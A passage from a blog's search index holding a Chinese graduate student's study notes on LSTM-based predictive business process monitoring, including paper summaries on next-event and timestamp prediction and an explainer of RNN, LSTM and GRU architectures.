略读几篇LSTM，Attention</li><li><input disabled="" type="checkbox"> 跑一个简单的Attention框架的代码，考虑一下最后研究是使用那个网络结构</li></ul>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> weekly </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>业务流程的LSTM精准模型</title>
      <link href="/2021/07/29/%E4%B8%9A%E5%8A%A1%E6%B5%81%E7%A8%8B%E7%9A%84LSTM%E7%B2%BE%E5%87%86%E6%A8%A1%E5%9E%8B/"/>
      <url>/2021/07/29/%E4%B8%9A%E5%8A%A1%E6%B5%81%E7%A8%8B%E7%9A%84LSTM%E7%B2%BE%E5%87%86%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>使用LSTM模型对事件下一步，时间戳和调用的资源进行预测。</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文主要是对于前人提出在LSTM中利用近似前缀预测—<a href="https://blog.zuishuailcq.xyz/2021/07/19/%E5%9F%BA%E4%BA%8ELSTM%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E4%B8%9A%E5%8A%A1%E8%BF%87%E7%A8%8B%E9%A2%84%E6%B5%8B%E7%9B%91%E6%8E%A7/">基于LSTM神经网络的业务过程预测监控 | 吾辈之人，自当自强不息！</a>的缺陷的改进，缺陷：</p><ol><li>无法处理数字变量</li><li>不能生成带有时间戳的时间序列</li><li>后续有文章提出通过one-hot编码来对事件进行分类，而不是使用嵌入维度来实现的，这样<strong>随着事件类型的增加，精度就会极度下降</strong>。</li></ol><blockquote><p>知识补充<br>后处理：在模型训练后，人为的修改模型结果使之预测结果更加符合真实情况。<br><a href="https://blog.csdn.net/xieyan0811/article/details/80549001">数据挖掘之_后处理_谢彦的技术博客-CSDN博客_数据后处理</a></p></blockquote><dl><dt><strong><font color="#006400">解决：</font></strong><br>本文通过提出用于建立新的预处理和后处理方法和架构以及使用LSTM神经网络的事件日志的生成模型来解决上述方法的局限性。</dt><dd>具体地说，本文提出了一种方法去学习模型，该方法可以生成由三组(事件类型、角色、时间戳)组成的轨迹(或从给定前缀开始的轨迹的后缀)。提出的方法结合了Tax等人[13]和Evermann等人[2]的优点，<font color="#483D8B">通过使用嵌入维度，同时支持事件日志中的分类属性和数字属性</font>。本文考虑了神经网络中共享层和特有层的不同组合所对应的三种体系结构。</dd></dl><p><strong><font color="#FF8C00">评估：</font></strong></p><ol><li>第一种方法比较了与不同体系结构、预处理和后处理选择相对应的所提出方法的备选实例。该评估的目的是<font color="#00008B">根据获取到的日志的特征</font>，得出关于哪些设计选择更可取的指南。</li><li>比较提出方法在上面三条约束的表现。</li></ol><h1 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h1><h2 id="LSTM-当前的进展"><a href="#LSTM-当前的进展" class="headerlink" title="LSTM 当前的进展"></a>LSTM 当前的进展</h2><ol><li>使用LSTM对于事件类型较少的序列进行迭代循环预测，使用的是one-hot编码将事件类型，事件戳映射到向量特征向量，并使用事件发生的时间特征对其进行补充。<strong>缺点</strong>是当事件类型较多的时候，该方法效果会变差。</li></ol><ul><li>该模型由共享LSTM层构成，其中包括一个专门用于预测事件的LSTM和一个预测事件的LSTM</li></ul><p><img src="http://files.shanqianche.cn/2021730/1627633758272.png" alt="2017-使用LSTM神经网络进行预测性业务流程监控"></p><ol start="2"><li>使用嵌入维度的LSTMs，可以减少输入长度和增加新的特征。<strong>缺点</strong>是依旧无法处理数值变量，所以也不能预测时间戳。<strong>优点</strong>是可以处理大量事件类型。</li></ol><ul><li>使用两层LSTMs隐藏层。</li></ul><p><img src="http://files.shanqianche.cn/2021730/1627636620079.png" alt="2017-利用深度学习预测过程行为"></p><ol start="3"><li>提出基于RNN的模型MM-Pred来预测下一步事件和流程后续。<strong>缺点</strong>是无法处理数值变量，所以也不能预测时间戳。</li></ol><ul><li>这种方法同时使用控制流信息（事件类型）和案例数据（事件属性）。</li><li>该结构由编码器、调制器和解码器组成。</li><li>编码器和解码器使用LSTM网络将每个事件的属性转换为隐藏表示或从隐藏表示转换为隐藏表示。</li><li>调制器组件求出可变长度序列比对权重向量，其中每个权重表示用于预测未来事件和属性的属性的相关性。</li></ul><p><img src="http://files.shanqianche.cn/202182/1627873762436.png" alt="多属性事件序列的深度预测模型"></p><ol start="4"><li>使用多阶段深度学习的方法来预测下一个事件。<strong>缺点</strong>是无法处理数值变量，所以也不能预测时间戳。</li></ol><ul><li>首先是将每个事件映射到特征向量</li><li>下一步使用transformations降低输入维度，通常有，通过提取n-gram、使用hash、将输入通过两个自动编码层等方法</li><li>将转化后的输入传给负责预测的前馈神经网络</li></ul><p><img src="http://files.shanqianche.cn/202182/1627887742568.png" alt="业务流程事件预测的多阶段深度学习方法"></p><ol start="5"><li>作者提出一种基于GRU的神经网络架构BINet，用于业务流程执行中的实时异常检测。该架构用于预测下一个事件及属性。</li></ol><ul><li>该方法旨在为跟踪中的每个事件分配一个似然分数，然后用于检测异常。这种方法表明，过程行为的生成模型也可用于异常检测。</li></ul><p><img src="http://files.shanqianche.cn/202182/1627907436804.png" alt="基于深度学习的多元业务流程异常检测"></p><ol start="6"><li>作者比较几种真实数据集在MMs，all-k MMs以及基于自动机的模型中预测下一步的准确性和性能。</li></ol><ul><li>结果表明，AKOM模型具有最高的精度（在某些情况下优于RNN体系结构），而基于自动机的模型具有较高的可解释性。</li></ul><p><img src="http://files.shanqianche.cn/202182/1627907971849.png" alt="下一个元素预测序列建模方法的跨学科比较"></p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p><img src="http://files.shanqianche.cn/2021811/1628666548975.png" alt="构建模型的步骤"></p><h2 id="预处理阶段"><a href="#预处理阶段" class="headerlink" title="预处理阶段"></a>预处理阶段</h2><h3 id="Data-transformation"><a href="#Data-transformation" class="headerlink" title="Data transformation"></a>Data transformation</h3><p><strong>根据属性性质（分类或连续）进行特定预处理。</strong></p><p><strong><font color="#294B71">分类：</font></strong></p><p>处理数据：将事件和资源作为类别属性，使用嵌入维度。</p><blockquote><p>向训练网络提供属性之间关联的正面和负面示例，使网络能够识别和定位具有相似特征的近似属性。根据NLP社区4中使用的一项通用建议，嵌入维度的数量被确定为类别数量的第四根，以避免它们之间可能发生冲突。生成的值作为不可训练的参数导出并在所有实验中重用，这样就不会增加模型的复杂性</p></blockquote><p><img src="http://files.shanqianche.cn/2021811/1628683817654.png" alt="用于训练嵌入层的网络结构和生成的4d空间被缩减为3d的空间"></p><p> <strong><font color="#E9967A">连续：</font></strong></p><p><font color="#1E90FF"> 对数据进行归一化，以供预测模型解释</font>。这里处理的事件之间的相对时间，问题在于不同日志，相对时间可能具有很大的可变性。 这种高可变性可以隐藏有关过程行为的有用信息，例如时间瓶颈或异常行为，如果不小心执行属性缩放，则可以隐藏这些信息。</p><p> 寻求一种合适的缩放方法。</p><p> <img src="http://files.shanqianche.cn/2021811/1628685428211.png" alt="最大值和对数归一化两种方法的对比"></p><h3 id="Sequences-creation"><a href="#Sequences-creation" class="headerlink" title="Sequences creation"></a>Sequences creation</h3><p> <strong>提取每个事件日志跟踪的固定大小的n-gram，以创建输入序列和预期事件来训练预测网络。</strong></p><p> <img src="http://files.shanqianche.cn/2021811/1628686156534.png" alt="从BPI 2012事件日志的案例id 174770中提取的五个n-gram"></p><p> <em>role表示的是事件与资源的关联</em></p><h2 id="Model-Structure-Definition-Phase"><a href="#Model-Structure-Definition-Phase" class="headerlink" title="Model Structure Definition Phase"></a>Model Structure Definition Phase</h2><p><img src="http://files.shanqianche.cn/2021811/1628686308297.png" alt="Baseline architecture"></p><p><img src="http://files.shanqianche.cn/2021811/1628687598994.png" alt="Tested architectures"></p><h2 id="Post-processing-Phase"><a href="#Post-processing-Phase" class="headerlink" title="Post-processing Phase"></a>Post-processing Phase</h2><p>从零前缀开始生成业务流程的完整跟踪中，传统使用的是arg max，直接根据下一个事件的最大概率来跟踪，但是这就会所有追踪的事件都倾向于概率最大值，对于低概率发生的事件无法追踪。这里作者使用的是arg max和随机选择的参数作为下一个事件的选择。</p><blockquote><p>我觉得应该使用softmax</p></blockquote><h1 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h1><blockquote><p>本节描述了两个实验评估。第一个实验比较了三种架构在前处理和后处理选择方面的不同实例。第二个实验将提出的方法与技术背景中其它论文中的下一个事件、后缀和剩余时间预测任务的三条基线进行比较</p></blockquote><h2 id="Data-Set"><a href="#Data-Set" class="headerlink" title="Data Set"></a>Data Set</h2><pre><code>在本实验中，使用了九个来自不同领域、具有不同特征的真实事件日志</code></pre><ul><li>Helpdesk5事件日志包含来自意大利软件公司helpdesk票务管理过程的记录</li><li>BPI 20126 中的两个事件日志与来自德国金融机构的贷款申请流程相关。 这个过程由三个子过程组成，我们从中使用了 W 子过程，以便与”下一个元素预测序列建模方法的跨学科比较”进行比较 。</li><li>BPI 20137中的事件日志与沃尔沃的IT事件和问题管理有关。我们使用完整的案例学习生成模型</li><li>BPI 20158中的五个事件日志包含五个荷兰城市在四年期间提供的建筑许可证申请数据。原始事件日志分为五个部分（每个市政局一个）。所有事件日志都在子流程级别指定，包括345多个活动。因此，按照”Diagnostics of building per-mit application process in dutch municipalities”中所述的步骤对其进行预处理，以便在阶段级别进行管理</li></ul><p><img src="http://files.shanqianche.cn/2021811/1628688257014.png" alt="Event logs description"></p><ol><li><em><font color="#A9A9A9">SF指根据其在记录道数量、事件、活动和序列长度方面的组成分为简单、中等和复杂。</font></em></li><li><em><font color="#A9A9A9">TV指据每个事件日志的平均持续时间和最大持续时间之间的关系，将时间变异性（TV）分为稳定或可变</font></em></li></ol><h2 id="Experimental-setup"><a href="#Experimental-setup" class="headerlink" title="Experimental setup"></a>Experimental setup</h2><p><strong><font color="#8A2BE2">目的：</font></strong><br>    使用 LSTM 模型从大小为0的前缀开始跟踪生成完整的事件日志，然后将生成的跟踪与原始日志中的流程进行比较。</p><p><font color="#1E90FF">方法：使用两个指标来评估生成的事件日志的相似性。</font></p><ol><li>Demerau-Levinstain（DL）算法根据一个字符串与另一个字符串相等所需的版本数测量序列之间的距离。该算法在每次执行插入、删除、替换和转置等操作时都进行惩罚。因此，我们使用其倒数来衡量生成的活动或角色序列与实际事件日志中观察到的序列之间的相似性。然后，较高的值意味着序列之间的相似性较高。</li><li>平均绝对误差（MAE）度量用于测量预测时间戳的误差。通过取观测值和预测值之间距离的绝对值，然后计算这些震级的平均值来计算该测量值。我们使用该度量来评估每对（生成轨迹、地面真值轨迹）的生成相对时间和观测时间之间的距离。</li></ol><blockquote><p>使用交叉验证，将事件日志分为两部分：70%用于培训，30%用于验证。第一个折叠被用作训练2000个模型的输入（每个事件日志大约220个模型）。<br>这平均220个模型配置了不同的预处理技术和体系结构。配置值是从972个组合的完整搜索空间中随机选择的。然后，使用每个经过培训的模型生成完整事件的新事件日志（参见第3节中描述的选择下一个活动的技术）。生成了每个配置的15个日志，并对其结果进行了平均。评估了32000多个生成的事件日志。</p></blockquote><h2 id="Results-and-Interpretation"><a href="#Results-and-Interpretation" class="headerlink" title="Results and Interpretation."></a>Results and Interpretation.</h2><p><img src="http://files.shanqianche.cn/2021811/1628689342024.png" alt="不同配置的事件日志中的相似性结果"></p><ul><li><font color="#A9A9A9">MAE列对应于预测记录道周期时间的平均绝对误差</font> </li></ul><p>结果表明，使用这种方法可以训练学习并可靠地再现原始日志的观察行为模式的模型。此外，研究结果表明，对于LSTM模型来说， <strong><font color="#A52A2A">学习词汇量较大</font></strong> 的序列比学习较长的序列更困难。要了解这些模式，需要更多的示例，如BPI2012和BPI2015的结果所示。这两个日志都有30多个活动，但在跟踪数量上有很大差异（见表2）。BPI2012的高度相似性还表明，使用嵌入维度处理大量事件类型可以改善结果，只要示例数量足以学习底层模式。</p><p>针对本实验中评估的模型结构构件，我们按照预处理、模型结构和超参数选择以及预测等阶段对其进行分析，以构建生成模型。</p><p><img src="http://files.shanqianche.cn/2021811/1628689921162.png" alt="Preprocessing phase components comparison"></p><p><strong><font color="#FF8C00">这里主要比较的是对于相对时间缩放方式，和进行缩放的作用。</font></strong></p><ol><li>a 说明了如何使用最大值作为缩放技术，具有很小时间变化的日志呈现更好的结果。相比之下，具有不规则结构的日志使用对数归一化具有较低的<font color="#0000FF"> MAE</font>【横坐标】。</li><li>b 展示了使用不同大小的 n-gram 时的 DL 相似性结果，与事件日志的结构有关。 我们可以观察到，使用更长的n-grams对于trace更长的日志有更好的结果，呈现出稳定的增长趋势。 相比之下，中、简单结构的事件日志趋势不明显。 因此，应将长 n-gram 的使用保留给具有很长跟踪的日志。**<font color="#006400">这里体现的是n-gram size对于预测结果的作用，只有复杂的日志呈现良好的正相关。</font>**</li></ol><p><img src="http://files.shanqianche.cn/2021811/1628690528922.png" alt="共享层的总体相似性"></p><p>关于模型结构定义阶段，图说明连接结构的总体相似度最低。相比之下，仅在分类属性之间共享信息的模型体系结构具有中等最佳性能。然而，它与专门的体系结构并不遥远，尽管它的分布范围更广。这意味着在不同性质的属性之间共享信息会在网络正在处理的模式中产生噪声，从而阻碍学习过程。</p><p><img src="http://files.shanqianche.cn/2021811/1628690699173.png" alt="下一个事件选择方法的比较"></p><p>关于预测阶段，图显示了随机选择在所有事件日志中如何优于arg max。这种行为在具有较长和复杂跟踪的事件日志中更为明显。结果表明，无论事件日志结构如何，随机选择都是评估学习过程的可取方法。</p><h2 id="Comparison-Against-Baselines"><a href="#Comparison-Against-Baselines" class="headerlink" title="Comparison Against Baselines"></a>Comparison Against Baselines</h2><h3 id="Experimental-setup-1"><a href="#Experimental-setup-1" class="headerlink" title="Experimental setup"></a>Experimental setup</h3><p><strong><font color="#FF00FF">目的：</font></strong><br>    评估我们的方法在预测下一个事件、剩余事件序列（即后缀）和剩余时间（对于不同长度的跟踪前缀）方面的相对性能。</p><ol><li>next event prediction — 为每个模型提供长度增加的跟踪前缀，从 1 到每个跟踪的长度。 对于每个前缀，我们预测下一个事件并测量准确性（正确预测的百分比）。</li><li> suffix and remaining time prediction — 为模型提供了长度增加的前缀，直到案件结束。</li></ol><p><strong><font color="#8A2BE2">baselines:</font></strong></p><ul><li>next event and suffix prediction</li></ul><ol><li> Predictive business process monitoring with LSTM neural networks</li><li> Predicting process behaviour using deep learning</li><li> A deep predictive model for multi-attribute event sequence</li></ol><ul><li>remaining time prediction</li></ul><ol><li>Predictive business process monitoring with LSTM neural networks【Helpdesk, BPI2012W and BPI2012 event logs】</li></ol><h3 id="Results-and-Interpretation-1"><a href="#Results-and-Interpretation-1" class="headerlink" title="Results and Interpretation"></a>Results and Interpretation</h3><p><img src="http://files.shanqianche.cn/2021811/1628691394455.png" alt="下一个事件和后缀预测结果"></p><p><strong>这些结果表明，分类属性的维度控制所采用的措施，使我们的方法即使在长序列中也能获得始终如一的良好性能。</strong></p><p><img src="http://files.shanqianche.cn/2021811/1628691420458.png" alt="剩余循环时间MAE的结果（以天为单位）"></p><p>图10显示了剩余循环时间预测的MAE。尽管我们的技术目标不是预测剩余时间，但与Tax等人相比，它在这项任务中实现了类似的性能——在一个日志中略逊于它，在另一个日志中略逊于它的长前缀。</p><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p><strong><font color="#FF8C00">优</font></strong></p><ol><li>评估表明，使用更长的n-gram可获得更高的精度</li><li>对数归一化是适用于高可变性测井的缩放方法，与总是选择最有可能的下一个事件相比，使用LSTM产生的概率随机选择下一个事件可导致更广泛的记录道和更高的精度。论文还表明，该方法在预测剩余事件序列及其从给定跟踪前缀开始的时间戳方面优于现有的基于LSTM的方法</li></ol><blockquote><p>作者预计，所提出的方法可以作为业务流程模拟的工具。实际上，从本质上讲，流程模拟器是一种通用模型，它生成由事件类型、资源和时间戳组成的跟踪集，并从中计算性能度量，如等待时间、循环时间和资源利用率。虽然流程模拟器依赖于可解释的流程模型（例如BPMN模型），但原则上可以使用能够生成事件跟踪的任何模型来模拟流程，其中每个事件都由事件类型（活动标签）、时间戳和资源组成。使用LSTM网络进行流程模拟的一个关键挑战是如何捕获“假设”场景（例如，删除任务或删除资源的效果）。</p></blockquote><p><strong><font color="#2F4F4F">future</font></strong><br>计划应用技术，使用”An eye into the future: Leveraging a-priori knowledge in predictive business process monitoring.”中的约束，从LSTM模型生成事件序列</p>]]></content>
      
      
      <categories>
          
          <category> paper </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> deep learning </tag>
            
            <tag> paper </tag>
            
            <tag> process mining </tag>
            
            <tag> LSTM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Long Short Term Memory Networks</title>
      <link href="/2021/07/19/Long%20Short%20Term%20Memory%20Networks/"/>
      <url>/2021/07/19/Long%20Short%20Term%20Memory%20Networks/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1842025914&auto=1&height=66"></iframe><p><a href="https://zhuanlan.zhihu.com/p/32085405">人人都能看懂的LSTM - 知乎</a><br><a href="https://zhuanlan.zhihu.com/p/37644325">RNN、LSTM、GRU基础原理篇 - 知乎</a><br><a href="https://blog.csdn.net/matrix_space/article/details/53374040">机器学习：深入理解 LSTM 网络 (一)_Matrix-11-CSDN博客_lstm 机器学习</a></p><blockquote><p>中文分词、词性标注、命名实体识别、机器翻译、语音识别都属于序列挖掘的范畴。<font color="#DC143C">序列挖掘</font>的特点就是某一步的输出不仅依赖于这一步的输入，还依赖于其他步的输入或输出。在序列挖掘领域传统的机器学习方法有HMM（Hidden Markov Model，隐马尔可夫模型）和CRF（Conditional Random Field，条件随机场），近年来流行深度学习算法RNN（Recurrent Neural Networks，循环神经网络）。</p></blockquote><h1 id="RNN"><a href="#RNN" class="headerlink" title="RNN"></a>RNN</h1><p><img src="http://files.shanqianche.cn/2021719/1626698381786.png" alt="RNN网络架构图"></p><p>比如一个句子中有5个词，要给这5个词标注词性，那相应的RNN就是个5层的神经网络，每一层的输入是一个词，每一层的输出是这个词的词性。<br><img src="http://files.shanqianche.cn/2021719/1626698589144.png" alt="讲解"></p><h1 id="RNN的变体"><a href="#RNN的变体" class="headerlink" title="RNN的变体"></a>RNN的变体</h1><h2 id="双向RNN"><a href="#双向RNN" class="headerlink" title="双向RNN"></a>双向RNN</h2><p>双向RNN认为otot不仅依赖于序列之前的元素，也跟tt之后的元素有关，这在序列挖掘中也是很常见的事实。</p><p><img src="http://files.shanqianche.cn/2021719/1626698749683.png" alt=" Bidirectional RNNs网络结构"></p><h2 id="深层双向RNN"><a href="#深层双向RNN" class="headerlink" title="深层双向RNN"></a>深层双向RNN</h2><p>在双向RNN的基础上，每一步由原来的一个隐藏层变成了多个隐藏层。</p><p><img src="http://files.shanqianche.cn/2021719/1626698820535.png" alt="Deep Bidirectional RNNs网络结构"></p><h1 id="LSTM"><a href="#LSTM" class="headerlink" title="LSTM"></a>LSTM</h1><p>前文提到，由于<font color="#9932CC"><strong>梯度消失/梯度爆炸</strong></font>的问题传统RNN在实际中很难处理长期依赖，而LSTM（Long Short Term Memory）则绕开了这些问题依然可以从语料中学习到长期依赖关系。</p><p><img src="http://files.shanqianche.cn/2021719/1626699453120.png" alt="传统RNN每一步的隐藏单元只是执行一个简单的tanh或ReLU操作"></p><p><img src="http://files.shanqianche.cn/2021719/1626699501199.png" alt=" LSTM每个循环的模块内又有4层结构:3个sigmoid层，1个tanh层"></p><p><strong><font color="#D2691E">解释LSTM模块：</font></strong></p><p><img src="http://files.shanqianche.cn/2021719/1626699615537.png" alt="图标说明"></p><ul><li>粉色的圆圈表示一个二目运算。</li><li>两个箭头汇合成一个箭头表示2个向量首尾相连拼接在一起。</li><li>一个箭头分叉成2个箭头表示一个数据被复制成2份，分发到不同的地方去。</li></ul><p> LSTM的关键是细胞状态C，一条水平线贯穿于图形的上方，这条线上只有些少量的线性操作，信息在上面流传很容易保持。</p><p><img src="http://files.shanqianche.cn/2021719/1626699717681.png" alt="忘记层"></p><ol><li>忘记层，决定细胞状态中<strong>丢弃什么信息</strong>。把ht−1和xt拼接起来，传给一个sigmoid函数，该函数输出0到1之间的值，这个值乘到细胞状态Ct−1上去。<font color="#FF8C00">sigmoid函数的输出值直接决定了状态信息保留多少</font>。比如当我们要预测下一个词是什么时，细胞状态可能包含当前主语的性别，因此正确的代词可以被选择出来。当我们看到新的主语，我们希望忘记旧的主语。</li></ol><p><img src="http://files.shanqianche.cn/2021719/1626700419154.png" alt="更新细胞状态"><br>2. 上一步的细胞状态Ct−1已经被忘记了一部分，接下来本步应该把哪些信息新加到细胞状态中呢？这里又包含2层：一个tanh层用来产生更新值的候选项C~t，tanh的输出在[-1,1]上，<strong>说明细胞状态在某些维度上需要加强，在某些维度上需要减弱</strong>；还有一个sigmoid层（输入门层），它的输出值要乘到tanh层的输出上，起到一个<strong>缩放</strong>的作用，<em>极端情况下sigmoid输出0说明相应维度上的细胞状态不需要更新</em>。在那个预测下一个词的例子中，我们希望增加新的主语的性别到细胞状态中，来替代旧的需要忘记的主语。</p><p><img src="http://files.shanqianche.cn/2021719/1626700649763.png" alt="生成新的细胞状态"><br>3. 现在可以让旧的细胞状态Ct−1与ft（f是forget忘记门的意思）相乘来丢弃一部分信息，然后再加个需要更新的部分it∗C~t（i是input输入门的意思），这就生成了<strong>新的细胞状态Ct</strong></p><p><img src="http://files.shanqianche.cn/2021719/1626700735024.png" alt="循环模块的输出"><br>4. 最后该决定输出什么了。输出值跟细胞状态有关，把Ct输给一个tanh函数得到输出值的候选项。<strong>候选项中的哪些部分最终会被输出由一个sigmoid层来决定</strong>。在那个预测下一个词的例子中，如果细胞状态告诉我们当前代词是第三人称，那我们就可以预测下一词可能是一个第三人称的动词。</p><h1 id="GRU"><a href="#GRU" class="headerlink" title="GRU"></a>GRU</h1><p>GRU（Gated Recurrent Unit）是LSTM最流行的一个变体，比LSTM模型要简单。没有了存储单元</p><p><img src="http://files.shanqianche.cn/2021719/1626700963311.png" alt="GRU"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>RNN 结构的一个吸引人之处在于其可以利用之前的输入信息。但是一个关键的需要解决的问题是当前的信息与之前的信息的关联度有长有短。<br>LSTM的内部结构。通过门控状态来控制传输状态，<strong>记住需要长时间记忆的，忘记不重要的信息</strong>；而不像普通的RNN那样只能够“呆萌”地仅有一种记忆叠加方式。对很多需要“长期记忆”的任务来说，尤其好用。、<br>但也因为引入了很多内容，导致参数变多，也使得训练难度加大了很多。因此很多时候我们往往会使用效果和LSTM相当但参数更少的GRU来构建大训练量的模型。</p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> algorithm </tag>
            
            <tag> process mining </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于LSTM神经网络的业务过程预测监控</title>
      <link href="/2021/07/19/%E5%9F%BA%E4%BA%8ELSTM%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E4%B8%9A%E5%8A%A1%E8%BF%87%E7%A8%8B%E9%A2%84%E6%B5%8B%E7%9B%91%E6%8E%A7/"/>
      <url>/2021/07/19/%E5%9F%BA%E4%BA%8ELSTM%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E4%B8%9A%E5%8A%A1%E8%BF%87%E7%A8%8B%E9%A2%84%E6%B5%8B%E7%9B%91%E6%8E%A7/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.youtube.com/watch?v=VAPwMDAm550&list=RDVAPwMDAm550&start_radio=1" title="我還年輕 我還年輕"><img src="https://res.cloudinary.com/marcomontalbano/image/upload/v1626681958/video_to_markdown/images/youtube--VAPwMDAm550-c05b58ac6eb4c4700831b2b3070cd403.jpg" alt="我還年輕 我還年輕"></a></p><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>本文研究了长-短期记忆（LSTM）神经网络作为一种预测模型。并证明LSTMs在预测运行案例的下一个事件及其时间戳方面优于现有的技术。</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>作者提到他的目的是提出一个可以适用的框架。本文的研究点：</p><ol><li>LSTMs能否被用于广泛的流程预测，以及如何应用？</li><li>如何保障LSTM在不同数据中的准确度始终如一？</li></ol><p>在不同预测内容中，作者适用了4个日志数据集进行验证比较。</p><h1 id="相关技术"><a href="#相关技术" class="headerlink" title="相关技术"></a>相关技术</h1><p>主要讲的是目前对于三种预测的技术，包括了，时间相关预测、事件结果的预测、正在执行事件的预测</p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><ul><li>数据集A</li><li>数据集A中所有序列 $A^{*}$</li><li>一个长度为n的序列 σ =&lt;  $a_{1}$ ,  $a_{2}$ ,  $a_{3}$ , …… ,  $a_{n}$  &gt;,空序列为&lt;&gt;</li><li>$σ_ { 1 } \cdot σ _ { 2 }$ 表示序列 $σ_{1}$ 与 $σ_{2}$ 的串联</li><li> $h d ^ { k } ( o ) = ( a _ { 1 } , a _ { 2 } , \cdots , a _ { k } )$ 为<strong>前缀长度</strong>为k（0&lt;k&lt;n） 的序列 σ的<strong>前缀</strong>。 $t l ^ { k } ( o ) = ( a _ { k + 1 } \cdots , a _ { n } )$ 是它的后缀。</li></ul><p>对于前缀后缀的一个<strong>栗子</strong>：<br>序列： $σ _ { 1 } = ( a , b , c , d , e )$<br>前缀长度为二的前缀： $h d ^ { 2 } ( σ _ { 1 } ) = ( a , b )$<br>后缀为： $t l ^ { 2 } ( σ _ { 1 } ) = ( c , d , e )$</p><ul><li> $\varepsilon$ 【伊普西隆】为所有事件集合，T为时域。</li><li> $\pi _{ \tau }\in \varepsilon  \rightarrow T$ 为事件分配事件戳</li><li> $\pi _{ A }\in \varepsilon  \rightarrow A$ 从事件集A种为一个流程分配活动<h2 id="RNN和LSTM"><a href="#RNN和LSTM" class="headerlink" title="RNN和LSTM"></a>RNN和LSTM</h2></li></ul><p><a href="https://blog.zuishuailcq.xyz/2021/07/19/Long%20Short%20Term%20Memory%20Networks/">Long Short Term Memory Networks | 吾辈之人，自当自强不息！</a></p><h1 id="下一个活动和时间戳预测"><a href="#下一个活动和时间戳预测" class="headerlink" title="下一个活动和时间戳预测"></a>下一个活动和时间戳预测</h1><p>介绍评估多种体系结构预测下一个事件和时间戳。</p><p><img src="http://files.shanqianche.cn/2021728/1627442124718.png" alt="事件预测算法"></p><p><img src="http://files.shanqianche.cn/2021728/1627442195597.png" alt="事件预测算法"></p><p>输入一个事件的前缀，然后预测下一个事件。</p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><blockquote><p><strong><font color="#D2691E">知识补充</font></strong><br>one hot编码是将类别变量转换为机器学习算法易于利用的一种形式的过程。<br>假设“花”的特征可能的取值为daffodil（水仙）、lily（百合）、rose（玫瑰）。one hot编码将其转换为三个特征：is_daffodil、is_lily、is_rose，这些特征都是二进制的。<br><a href="https://zhuanlan.zhihu.com/p/37471802">什么是one hot编码？为什么要使用one hot编码？ - 知乎</a></p></blockquote><ol><li>首先为LSTM构建特征向量矩阵，作为输入。</li></ol><p>事件e=σ（i）的时间特征指的是在trace中的上一个时间和当前时间之间的时间。转换函数：<br><img src="http://files.shanqianche.cn/2021720/1626745464036.png" alt="enter description here"></p><p>三种时间特征：fvt1表示事件的当前时间特征【与上一个时间的时间间隔】，同时也添加了包函一天时间的特征fvt2和包含一周的时间特征fvt3.这样当事件在工作日或者工作周结束的时候预测下一个活动的事件中时间间隔则会更长。</p><ul><li>LSTM可以通过fvt1学到不同节点的事件宇时间差的依赖关系。</li><li>fvt2，fvt3的加入，是为处理有些有些事件超出了工作日的特殊情况，因为传统的日志处理中只记录工作日中的。</li></ul><ol start="2"><li>对时间步长k【第k个事件的时间】的输出 $o _ { a } ^ { k }$ 进行one-hot编码。</li></ol><p><font color="#6495ED">异常情况</font></p><ul><li>当在时间k为事件的结尾，既没有新的事件可以预测。 </li></ul><p><font color="#B22222"> <strong>解决</strong></font></p><ul><li>当在时间k结束时,给输出的one-hot编码向量增加额外标记值1 </li></ul><ol start="3"><li><p>设置第二个输出值 $o_{t}^{k}$ 为下一个时间间隔的 $fv_{t1}$ 值。当知道当前时间戳，就可以计算到下一个事件的时间戳。</p></li><li><p>使用Adam算法【梯度下降算法】进行神经网络权重优化</p></li></ol><p><strong><font color="#FF1493">如何优化：</font></strong></p><ul><li>最小化基础事件one-hot编码和被预测的下一个事件的one-hot编码的<font color="#0000FF">交叉熵</font>。</li><li>最小化事件和预测事件之间时间的<font color="#FF1493">平均误差</font>（MAE）</li></ul><h2 id="模型的构建"><a href="#模型的构建" class="headerlink" title="模型的构建"></a>模型的构建</h2><p><img src="http://files.shanqianche.cn/2021727/1627371341818.png" alt="单任务层神经网络结构"></p><p><img src="http://files.shanqianche.cn/2021727/1627371437071.png" alt="共享多任务层神经网络结构"></p><p><img src="http://files.shanqianche.cn/2021727/1627371484245.png" alt="n层共享，m层单任务混合神经网络结构"></p><ol><li>使用相同的数据特征，分别单独训练两个模型，一个是预测下一步事件，另一个是预测下一个时间戳，如图a</li><li>多任务学习可以在同一个神经网络结构学习到多个模型，例如图b，同一个LSTM神经网络结构学习输出两个模型。</li><li>混合模型</li></ol><h2 id="实现"><a href="#实现" 